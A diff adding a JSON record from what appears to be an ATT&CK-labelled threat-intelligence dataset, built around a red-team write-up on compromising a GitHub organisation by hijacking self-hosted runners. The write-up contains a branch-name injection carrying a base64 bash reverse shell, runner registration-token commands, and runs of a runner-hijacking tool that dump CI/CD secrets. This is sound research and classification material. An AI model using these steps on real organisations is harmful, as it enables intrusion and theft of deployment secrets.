@@ -1,0 +1,217 @@
+{
+  "original_txt": "Hijacking GitHub runners to compromise the organization\nIn a recent engagement we managed to compromise a GitHub app allowed to register self-hosted runners at the organization level. Turns out, it is possible to register a GitHub runner with the ubuntu-latest\ntag, granting access to jobs originally designated for GitHub-provisioned runners. Using this method, an attacker could compromise any workflow of the organization and steal CI/CD secrets or push malicious code on the different repositories.\nLooking to improve your skills? Discover our trainings sessions! Learn more.\nInitial access\nThe engagement started with developer access to the targeted GitHub organization, with the objective to assess the security implication of an account compromise or a malicious developer. To explain the different steps of the intrusion we replicated the vulnerable environment. In our lab we have 2 repositories, the first one vulnerable and a second one containing sensitive secrets used to deploy part of the infrastructure (Infrastructure As Code) on cloud providers.\nThe sensitive repository contains one GitHub workflow using CI/CD (Continuous Integration / Continuous Delivery) secrets that are used to access cloud providers:\nBy default, GitHub offers free virtual machines that can be used to run code during the CI/CD process. In the previous example, the runs-on\ndirective indicates that the workflow must run on a runner with the ubuntu-latest\ntag. This label is one of the tags meaning the workflow should be executed on a runner provided by GitHub. The complete list of such tags can be found in the official documentation. They are used to specify the type of runner and the operating system needed for a workflow. The ubuntu-latest\nlabel is quite common.\nIn the previous example we can also observe that the workflow only runs when a developer performs a push on any branch:\non:\npush:\nFinally, this repository is protected with branch protections. Even with write access it would not be possible to deploy a malicious workflow with nord-stream to extract the different secrets, since the required_pull_request_reviews\nprotection is enabled:\n$ gh api -H \"Accept: application/vnd.github+json\" -H \"X-GitHub-Api-Version: 2022-11-28\" /repos/syncicd/sensitive-repo/branches/main/protection | jq\n{\n[...]\n\"required_pull_request_reviews\": {\n\"required_approving_review_count\": 1\n},\n\"required_signatures\": {\n\"enabled\": true\n},\n\"enforce_admins\": {\n\"enabled\": true\n},\n\"allow_force_pushes\": {\n\"enabled\": false\n},\n[...]\nOn the vulnerable repository there is one vulnerable workflow running on a self-hosted runner. Take time to analyze it if you want to find the vulnerability yourself:\nThis workflow is set to run when a comment is posted on a pull request. Between lines 12 and 22, it retrieves the pull request reference associated with the comment. It then uses the GitHub API through some JavaScript to obtain the branch reference of the targeted pull request. Finally, the code performs a checkout of the code coming from the pull request at line 26.\nEach workflow trigger comes with an associated GitHub context, offering comprehensive information about the event that initiated it. This includes details about the user who triggered the event, the branch name, and other relevant contextual information. Certain components of this event data, such as the base repository name, or pull request number, cannot be manipulated or exploited for injection by the user who initiated the event (e.g. in the case of a pull request). This ensures a level of control and security over the information provided by the GitHub context during workflow execution.\nContexts can be accessed using the following expression syntax:\n${{ <context> }}\nAt runtime, the context will be replaced with the associated value, like a match and replace. More on this in the following article.\nThe vulnerability is present at line 25. The code uses the GitHub context to obtain a reference to the pull request, which corresponds to the branch name of the pull request. This branch name is under the attacker's control, meaning they can create a dummy pull request with the following branch name:\nThen to trigger the vulnerable code, the attacker just need to create a comment on the associated pull request:\nThis will trigger the workflow:\nBecause the workflow uses the GitHub context with attacker-controlled data, the following code will be executed:\n- name: checkout code\nrun: |\nbranch=\"\";{echo,c2ggLWkgPiYgL2Rldi90Y3AveC54LngueC84MCAwPiYxCg==}|{base64,-d}|{bash,-i};echo\"\"\ngit checkout $branch\necho \"Do something\"\nThe Base64 data is just a bash reverse shell:\n$ rlwrap nc -lvp 80\nListening on 0.0.0.0 80\nsh: 0: can't access tty; job control turned off\n# id\nuid=0(root) gid=0(root) groups=0(root)\nOrganization compromise\nInside this runner we found some interesting secrets belonging to a GitHub app in the environment variables:\n# env\nGH_APP_ID=889830\nGH_APP_PVK=-----BEGIN RSA PRIVATE KEY-----\nMIIE[...]\n[...]\nFrom the GitHub documentation:\nGitHub Apps are tools that extend GitHub's functionality. GitHub Apps can do things on GitHub like open issues, comment on pull requests, and manage projects. They can also do things outside of GitHub based on events that happen on GitHub. For example, a GitHub App can post on Slack when an issue is opened on GitHub.\nMore on this in the following article.\nA GitHub App possesses an identity within GitHub and can have associated permissions. These permissions can be retrieved either through the REST API or by utilizing this GitHub CLI extension:\n$ gh token generate --key leaked-private-key.pem --app-id 889830\n{\n\"token\": \"ghs_yht[...]\",\n\"expires_at\": \"2024-05-02T14:00:13Z\",\n\"permissions\": {\n\"organization_self_hosted_runners\": \"write\"\n}\n}\nWe can see that this GitHub app is granted write access to the organization_self_hosted_runners\npermission, which sounds good. This permission can be used to create a registration token for the whole organization:\n$ export GH_TOKEN=\"ghs_yht[...]\"\n$ gh api --method POST -H \"Accept: application/vnd.github+json\" -H \"X-GitHub-Api-Version: 2022-11-28\" /orgs/syncicd/actions/runners/registration-token | jq\n{\n\"token\": \"BIHLYJS[...]DJN5XA\",\n\"expires_at\": \"2024-05-02T16:30:22.252+02:00\"\n}\nAn attacker can use this token to register a self-hosted runner at the organization level. By leveraging an existing configured GitHub runner like this, an attacker could register a runner with a tag belonging to other self-hosted runners, potentially hijacking some jobs. However, when GitHub dispatches jobs, everything is encrypted with a different key. Although an attacker could monitor new jobs and attempt to dump the runner's memory for secrets, this approach is not practical nor convenient.\nDuring our assessment we developed a Python script to fake a GitHub runner. The idea of this tool is based on @frichette_n's original idea on GitLab. By setting up a proxy between a self-hosted runner and GitHub, it is possible to reverse the different messages exchanged to register a runner and fetch the jobs. The crypto part was already done by @karimpwnz in his article.\nAfter some testing we discovered that it is possible to register a runner with the ubuntu-latest\nlabel, which was mentioned earlier in this article:\nAs the runner is registered at the organization level, any workflow containing the ubuntu-latest\ntag will use our runner by default (if available). Here is a demo of the tool:\n$ gh-hijack-runner.py --registration-token BIHLYJXS[...]5XA --url https://github.com/syncicd --labels ubuntu-latest\n[+] Session ID: 26113d38-5474-41dd-a4eb-42a0e77ecb28\n[+] AES key: JnowJl[...]Hox6bw==\n[+] New Job: deploy (messageId=2)\n- SENSITIVE_CLOUD_KEY: cloud_key_ela[...]\n- SENSITIVE_SSH_KEY: -----BEGIN OPENSSH PRIVATE KEY-----\nb3B[...]\n[...]\n- system.github.token: ghs_CVe[...]\nAll the secrets of the sensitive-repo\nare obtained.\nWith this technique, there is no need to bypass all the branch protections of the sensitive-repo\n. When a legitimate user pushes some code on the repository, the malicious runner will be picked and all the secrets leaked.\nIt is worth mentioning that the tool can also be used in case you successfully leaked runner credentials:\n$ gh-hijack-runner.py --rsa-params credentials_rsaparams.json --credentials credentials.json --runner runner.json\n[+] Session ID: 3c88c6f7-5764-4121-b9bf-2536ee2539b7\n[+] AES key: eLN3rhf3D[...]UHewLw==\n[+] New Job: init (messageId=2)\n- REPO_SECRET: repo secret\n- SUPER_SECRET: super secret password\n- system.github.token: ghs_RqD[...]\nThese credentials can be found inside an existing runner:\nroot@9f8f6f1fdfa6:/actions-runner# ll\n-rw-r--r-- 1 root root 266 Apr 21 12:27 .credentials\n-rw------- 1 root root 1667 Apr 21 12:27 .credentials_rsaparams\n-rw-r--r-- 1 root root 325 Apr 21 12:27 .runner\nHowever, to fetch jobs, the runner will establish a session with GitHub and each runner can only maintain one session at a time. To create a new session, you need to delete the current session established by the legitimate runner. The session ID can be found here:\nroot@9f8f6f1fdfa6:/actions-runner# cat _diag/* | grep -i session\n[...]\n[2024-04-21 18:03:46Z INFO MessageListener] Message '5' received from session 'aab007e0-eedd-4c1b-96b4-a7c2c128c31a'.\nThen, the current session can be deleted:\n$ gh-hijack-runner.py --rsa-params credentials_rsaparams.json --credentials credentials.json --runner runner.json --delete-session-id aab007e0-eedd-4c1b-96b4-a7c2c128c31a\n[+] Session aab007e0-eedd-4c1b-96b4-a7c2c128c31a.\nNote however that deleting the current session will crash the legitimate runner. The script only displays the secrets and returns an error to GitHub, but there is no indication that a malicious runner was employed in this process:\nConclusion\nIn this article we demonstrate a GitHub privilege escalation technique from write access to the organization_self_hosted_runners\npermission. This leverages the fact that it is possible to register a self-hosted runner with the ubuntu-latest\ntag. We developed a python script that can be used to deploy such a runner and leak all CI/CD secrets of all the workflows in the targeted repository. The tool is available on our GitHub.",
+  "sanitized_txt": "Hijacking GitHub runners to compromise the organization In a recent engagement we managed to compromise a GitHub app allowed to register self-hosted runners at the organization level. Turns out, it is possible to register a GitHub runner with the ubuntu-latest tag, granting access to jobs originally designated for GitHub-provisioned runners. Using this method, an attacker could compromise any workflow of the organization and steal CI/CD secrets or push malicious code on the different repositories.\nLooking to improve your skills? Discover our trainings sessions! Learn more.\nInitial access The engagement started with developer access to the targeted GitHub organization, with the objective to assess the security implication of an account compromise or a malicious developer. To explain the different steps of the intrusion we replicated the vulnerable environment. In our lab we have 2 repositories, the first one vulnerable and a second one containing sensitive secrets used to deploy part of the infrastructure (Infrastructure As Code) on cloud providers.\nThe sensitive repository contains one GitHub workflow using CI/CD (Continuous Integration / Continuous Delivery) secrets that are used to access cloud providers:\nBy default, GitHub offers free virtual machines that can be used to run code during the CI/CD process. In the previous example, the runs-on directive indicates that the workflow must run on a runner with the ubuntu-latest tag. This label is one of the tags meaning the workflow should be executed on a runner provided by GitHub. The complete list of such tags can be found in the official documentation. They are used to specify the type of runner and the operating system needed for a workflow. The ubuntu-latest label is quite common.\nIn the previous example we can also observe that the workflow only runs when a developer performs a push on any branch:\non:\npush:\nFinally, this repository is protected with branch protections. Even with write access it would not be possible to deploy a malicious workflow with nord-stream to extract the different secrets, since the required_pull_request_reviews protection is enabled:\n$ gh api -H \"Accept: application/vnd.github+json\" -H \"X-GitHub-Api-Version: 2022-11-28\" /repos/syncicd/sensitive-repo/branches/main/protection | jq { [...] \"required_pull_request_reviews\": { \"required_approving_review_count\": 1 }, \"required_signatures\": { \"enabled\": true }, \"enforce_admins\": { \"enabled\": true }, \"allow_force_pushes\": { \"enabled\": false }, [...] On the vulnerable repository there is one vulnerable workflow running on a self-hosted runner. Take time to analyze it if you want to find the vulnerability yourself:\nThis workflow is set to run when a comment is posted on a pull request. Between lines 12 and 22, it retrieves the pull request reference associated with the comment. It then uses the GitHub API through some JavaScript to obtain the branch reference of the targeted pull request. Finally, the code performs a checkout of the code coming from the pull request at line 26.\nEach workflow trigger comes with an associated GitHub context, offering comprehensive information about the event that initiated it. This includes details about the user who triggered the event, the branch name, and other relevant contextual information. Certain components of this event data, such as the base repository name, or pull request number, cannot be manipulated or exploited for injection by the user who initiated the event (e.g. in the case of a pull request). This ensures a level of control and security over the information provided by the GitHub context during workflow execution.\nContexts can be accessed using the following expression syntax:\n${{ <context> }} At runtime, the context will be replaced with the associated value, like a match and replace. More on this in the following article.\nThe vulnerability is present at line 25. The code uses the GitHub context to obtain a reference to the pull request, which corresponds to the branch name of the pull request. This branch name is under the attacker's control, meaning they can create a dummy pull request with the following branch name:\nThen to trigger the vulnerable code, the attacker just need to create a comment on the associated pull request:\nThis will trigger the workflow:\nBecause the workflow uses the GitHub context with attacker-controlled data, the following code will be executed:\n- name: checkout code run: | branch=\"\";{echo,c2ggLWkgPiYgL2Rldi90Y3AveC54LngueC84MCAwPiYxCg==}|{base64,-d}|{bash,-i};echo\"\" git checkout $branch echo \"Do something\" The Base64 data is just a bash reverse shell:\n$ rlwrap nc -lvp 80 Listening on 0.0.0.0 80 sh: 0: can't access tty; job control turned off # id uid=0(root) gid=0(root) groups=0(root) Organization compromise Inside this runner we found some interesting secrets belonging to a GitHub app in the environment variables:\n# env GH_APP_ID=889830 GH_APP_PVK=-----BEGIN RSA PRIVATE KEY----- MIIE[...] [...] From the GitHub documentation:\nGitHub Apps are tools that extend GitHub's functionality. GitHub Apps can do things on GitHub like open issues, comment on pull requests, and manage projects. They can also do things outside of GitHub based on events that happen on GitHub. For example, a GitHub App can post on Slack when an issue is opened on GitHub.\nMore on this in the following article.\nA GitHub App possesses an identity within GitHub and can have associated permissions. These permissions can be retrieved either through the REST API or by utilizing this GitHub CLI extension:\n$ gh token generate --key leaked-private-key.pem --app-id 889830 { \"token\": \"ghs_yht[...]\", \"expires_at\": \"2024-05-02T14:00:13Z\", \"permissions\": { \"organization_self_hosted_runners\": \"write\" } } We can see that this GitHub app is granted write access to the organization_self_hosted_runners permission, which sounds good. This permission can be used to create a registration token for the whole organization:\n$ export GH_TOKEN=\"ghs_yht[...]\" $ gh api --method POST -H \"Accept: application/vnd.github+json\" -H \"X-GitHub-Api-Version: 2022-11-28\" /orgs/syncicd/actions/runners/registration-token | jq { \"token\": \"BIHLYJS[...]DJN5XA\", \"expires_at\": \"2024-05-02T16:30:22.252+02:00\" } An attacker can use this token to register a self-hosted runner at the organization level. By leveraging an existing configured GitHub runner like this, an attacker could register a runner with a tag belonging to other self-hosted runners, potentially hijacking some jobs. However, when GitHub dispatches jobs, everything is encrypted with a different key. Although an attacker could monitor new jobs and attempt to dump the runner's memory for secrets, this approach is not practical nor convenient.\nDuring our assessment we developed a Python script to fake a GitHub runner. The idea of this tool is based on @frichette_n's original idea on GitLab. By setting up a proxy between a self-hosted runner and GitHub, it is possible to reverse the different messages exchanged to register a runner and fetch the jobs. The crypto part was already done by @karimpwnz in his article.\nAfter some testing we discovered that it is possible to register a runner with the ubuntu-latest label, which was mentioned earlier in this article:\nAs the runner is registered at the organization level, any workflow containing the ubuntu-latest tag will use our runner by default (if available). Here is a demo of the tool:\n$ gh-hijack-runner.py --registration-token BIHLYJXS[...]5XA --url https://github.com/syncicd --labels ubuntu-latest [+] Session ID: 26113d38-5474-41dd-a4eb-42a0e77ecb28 [+] AES key: JnowJl[...]Hox6bw== [+] New Job: deploy (messageId=2) - SENSITIVE_CLOUD_KEY: cloud_key_ela[...] - SENSITIVE_SSH_KEY: -----BEGIN OPENSSH PRIVATE KEY----- b3B[...] [...] - system.github.token: ghs_CVe[...] All the secrets of the sensitive-repo are obtained.\nWith this technique, there is no need to bypass all the branch protections of the sensitive-repo . When a legitimate user pushes some code on the repository, the malicious runner will be picked and all the secrets leaked.\nIt is worth mentioning that the tool can also be used in case you successfully leaked runner credentials:\n$ gh-hijack-runner.py --rsa-params credentials_rsaparams.json --credentials credentials.json --runner runner.json [+] Session ID: 3c88c6f7-5764-4121-b9bf-2536ee2539b7 [+] AES key: eLN3rhf3D[...]UHewLw== [+] New Job: init (messageId=2) - REPO_SECRET: repo secret - SUPER_SECRET: super secret password - system.github.token: ghs_RqD[...] These credentials can be found inside an existing runner:\nroot@9f8f6f1fdfa6:/actions-runner# ll -rw-r--r-- 1 root root 266 Apr 21 12:27 .credentials -rw------- 1 root root 1667 Apr 21 12:27 .credentials_rsaparams -rw-r--r-- 1 root root 325 Apr 21 12:27 .runner However, to fetch jobs, the runner will establish a session with GitHub and each runner can only maintain one session at a time. To create a new session, you need to delete the current session established by the legitimate runner. The session ID can be found here:\nroot@9f8f6f1fdfa6:/actions-runner# cat _diag/* | grep -i session [...] [2024-04-21 18:03:46Z INFO MessageListener] Message '5' received from session 'aab007e0-eedd-4c1b-96b4-a7c2c128c31a'.\nThen, the current session can be deleted:\n$ gh-hijack-runner.py --rsa-params credentials_rsaparams.json --credentials credentials.json --runner runner.json --delete-session-id aab007e0-eedd-4c1b-96b4-a7c2c128c31a [+] Session aab007e0-eedd-4c1b-96b4-a7c2c128c31a.\nNote however that deleting the current session will crash the legitimate runner. The script only displays the secrets and returns an error to GitHub, but there is no indication that a malicious runner was employed in this process:\nConclusion In this article we demonstrate a GitHub privilege escalation technique from write access to the organization_self_hosted_runners permission. This leverages the fact that it is possible to register a self-hosted runner with the ubuntu-latest tag. We developed a python script that can be used to deploy such a runner and leak all CI/CD secrets of all the workflows in the targeted repository. The tool is available on our GitHub.",
+  "ID_list": [
+    "T1677"
+  ],
+  "Name_list": [
+    "Execution",
+    "Initial Access",
+    "Privilege Escalation",
+    "Proxy"
+  ],
+  "TTP_sentences": {
+    "T1677": [
+      {
+        "sentence": "Hijacking GitHub runners to compromise the organization In a recent engagement we managed to compromise a GitHub app allowed to register self-hosted runners at the organization level.",
+        "score": 0.5064
+      },
+      {
+        "sentence": "Turns out, it is possible to register a GitHub runner with the ubuntu-latest tag, granting access to jobs originally designated for GitHub-provisioned runners.",
+        "score": 0.4088
+      },
+      {
+        "sentence": "Using this method, an attacker could compromise any workflow of the organization and steal CI/CD secrets or push malicious code on the different repositories.",
+        "score": 0.7241
+      },
+      {
+        "sentence": "Looking to improve your skills?",
+        "score": 0.3209
+      },
+      {
+        "sentence": "Learn more.",
+        "score": 0.3891
+      },
+      {
+        "sentence": "Initial access The engagement started with developer access to the targeted GitHub organization, with the objective to assess the security implication of an account compromise or a malicious developer.",
+        "score": 0.5002
+      },
+      {
+        "sentence": "To explain the different steps of the intrusion we replicated the vulnerable environment.",
+        "score": 0.457
+      },
+      {
+        "sentence": "In our lab we have 2 repositories, the first one vulnerable and a second one containing sensitive secrets used to deploy part of the infrastructure (Infrastructure As Code) on cloud providers.",
+        "score": 0.5929
+      },
+      {
+        "sentence": "The sensitive repository contains one GitHub workflow using CI/CD (Continuous Integration / Continuous Delivery) secrets that are used to access cloud providers: By default, GitHub offers free virtual machines that can be used to run code during the CI/CD process.",
+        "score": 0.616
+      },
+      {
+        "sentence": "In the previous example, the runs-on directive indicates that the workflow must run on a runner with the ubuntu-latest tag.",
+        "score": 0.3742
+      },
+      {
+        "sentence": "This label is one of the tags meaning the workflow should be executed on a runner provided by GitHub.",
+        "score": 0.484
+      },
+      {
+        "sentence": "The complete list of such tags can be found in the official documentation.",
+        "score": 0.3253
+      },
+      {
+        "sentence": "They are used to specify the type of runner and the operating system needed for a workflow.",
+        "score": 0.3091
+      },
+      {
+        "sentence": "In the previous example we can also observe that the workflow only runs when a developer performs a push on any branch: on: push: Finally, this repository is protected with branch protections.",
+        "score": 0.5351
+      },
+      {
+        "sentence": "Take time to analyze it if you want to find the vulnerability yourself: This workflow is set to run when a comment is posted on a pull request.",
+        "score": 0.5574
+      },
+      {
+        "sentence": "Between lines 12 and 22, it retrieves the pull request reference associated with the comment.",
+        "score": 0.412
+      },
+      {
+        "sentence": "It then uses the GitHub API through some JavaScript to obtain the branch reference of the targeted pull request.",
+        "score": 0.4364
+      },
+      {
+        "sentence": "Finally, the code performs a checkout of the code coming from the pull request at line 26.",
+        "score": 0.5033
+      },
+      {
+        "sentence": "Each workflow trigger comes with an associated GitHub context, offering comprehensive information about the event that initiated it.",
+        "score": 0.4647
+      },
+      {
+        "sentence": "Certain components of this event data, such as the base repository name, or pull request number, cannot be manipulated or exploited for injection by the user who initiated the event (e.g. in the case of a pull request).",
+        "score": 0.5887
+      },
+      {
+        "sentence": "This ensures a level of control and security over the information provided by the GitHub context during workflow execution.",
+        "score": 0.5024
+      },
+      {
+        "sentence": "Contexts can be accessed using the following expression syntax: ${{ <context> }} At runtime, the context will be replaced with the associated value, like a match and replace.",
+        "score": 0.3138
+      },
+      {
+        "sentence": "More on this in the following article.",
+        "score": 0.3741
+      },
+      {
+        "sentence": "The vulnerability is present at line 25.",
+        "score": 0.4061
+      },
+      {
+        "sentence": "The code uses the GitHub context to obtain a reference to the pull request, which corresponds to the branch name of the pull request.",
+        "score": 0.441
+      },
+      {
+        "sentence": "GitHub Apps can do things on GitHub like open issues, comment on pull requests, and manage projects.",
+        "score": 0.4386
+      },
+      {
+        "sentence": "They can also do things outside of GitHub based on events that happen on GitHub.",
+        "score": 0.4076
+      },
+      {
+        "sentence": "For example, a GitHub App can post on Slack when an issue is opened on GitHub.",
+        "score": 0.4286
+      },
+      {
+        "sentence": "More on this in the following article.",
+        "score": 0.3741
+      },
+      {
+        "sentence": "A GitHub App possesses an identity within GitHub and can have associated permissions.",
+        "score": 0.3965
+      },
+      {
+        "sentence": "These permissions can be retrieved either through the REST API or by utilizing this GitHub CLI extension: $ gh token generate --key leaked-private-key.pem --app-id 889830 { \"token\": \"ghs_yht[...]\", \"expires_at\": \"2024-05-02T14:00:13Z\", \"permissions\": { \"organization_self_hosted_runners\": \"write\" } } We can see that this GitHub app is granted write access to the organization_self_hosted_runners permission, which sounds good.",
+        "score": 0.4282
+      },
+      {
+        "sentence": "This permission can be used to create a registration token for the whole organization: $ export GH_TOKEN=\"ghs_yht[...]\" $ gh api --method POST -H \"Accept: application/vnd.github+json\" -H \"X-GitHub-Api-Version: 2022-11-28\" /orgs/syncicd/actions/runners/registration-token | jq { \"token\": \"BIHLYJS[...]DJN5XA\", \"expires_at\": \"2024-05-02T16:30:22.252+02:00\" } An attacker can use this token to register a self-hosted runner at the organization level.",
+        "score": 0.4396
+      },
+      {
+        "sentence": "By leveraging an existing configured GitHub runner like this, an attacker could register a runner with a tag belonging to other self-hosted runners, potentially hijacking some jobs.",
+        "score": 0.4278
+      },
+      {
+        "sentence": "However, when GitHub dispatches jobs, everything is encrypted with a different key.",
+        "score": 0.4616
+      },
+      {
+        "sentence": "Although an attacker could monitor new jobs and attempt to dump the runner's memory for secrets, this approach is not practical nor convenient.",
+        "score": 0.3983
+      },
+      {
+        "sentence": "During our assessment we developed a Python script to fake a GitHub runner.",
+        "score": 0.4241
+      },
+      {
+        "sentence": "The idea of this tool is based on @frichette_n's original idea on GitLab.",
+        "score": 0.4744
+      },
+      {
+        "sentence": "By setting up a proxy between a self-hosted runner and GitHub, it is possible to reverse the different messages exchanged to register a runner and fetch the jobs.",
+        "score": 0.438
+      },
+      {
+        "sentence": "The crypto part was already done by @karimpwnz in his article.",
+        "score": 0.4394
+      },
+      {
+        "sentence": "After some testing we discovered that it is possible to register a runner with the ubuntu-latest label, which was mentioned earlier in this article: As the runner is registered at the organization level, any workflow containing the ubuntu-latest tag will use our runner by default (if available).",
+        "score": 0.478
+      },
+      {
+        "sentence": "Here is a demo of the tool: $ gh-hijack-runner.py --registration-token BIHLYJXS[...]5XA --url https://github.com/syncicd --labels ubuntu-latest [+] Session ID: 26113d38-5474-41dd-a4eb-42a0e77ecb28 [+] AES key: JnowJl[...]Hox6bw== [+] New Job: deploy (messageId=2) - SENSITIVE_CLOUD_KEY: cloud_key_ela[...] - SENSITIVE_SSH_KEY: -----BEGIN OPENSSH PRIVATE KEY----- b3B[...] [...] - system.github.token: ghs_CVe[...] All the secrets of the sensitive-repo are obtained.",
+        "score": 0.4501
+      },
+      {
+        "sentence": "With this technique, there is no need to bypass all the branch protections of the sensitive-repo .",
+        "score": 0.4176
+      },
+      {
+        "sentence": "When a legitimate user pushes some code on the repository, the malicious runner will be picked and all the secrets leaked.",
+        "score": 0.5864
+      },
+      {
+        "sentence": "To create a new session, you need to delete the current session established by the legitimate runner.",
+        "score": 0.4061
+      },
+      {
+        "sentence": "The session ID can be found here: root@9f8f6f1fdfa6:/actions-runner# cat _diag/* | grep -i session [...] [2024-04-21 18:03:46Z INFO MessageListener] Message '5' received from session 'aab007e0-eedd-4c1b-96b4-a7c2c128c31a'.",
+        "score": 0.3156
+      },
+      {
+        "sentence": "Then, the current session can be deleted: $ gh-hijack-runner.py --rsa-params credentials_rsaparams.json --credentials credentials.json --runner runner.json --delete-session-id aab007e0-eedd-4c1b-96b4-a7c2c128c31a [+] Session aab007e0-eedd-4c1b-96b4-a7c2c128c31a.",
+        "score": 0.4031
+      },
+      {
+        "sentence": "Note however that deleting the current session will crash the legitimate runner.",
+        "score": 0.3742
+      },
+      {
+        "sentence": "The script only displays the secrets and returns an error to GitHub, but there is no indication that a malicious runner was employed in this process: Conclusion In this article we demonstrate a GitHub privilege escalation technique from write access to the organization_self_hosted_runners permission.",
+        "score": 0.5173
+      },
+      {
+        "sentence": "We developed a python script that can be used to deploy such a runner and leak all CI/CD secrets of all the workflows in the targeted repository.",
+        "score": 0.6617
+      },
+      {
+        "sentence": "The tool is available on our GitHub.",
+        "score": 0.4291
+      }
+    ]
+  }
+}
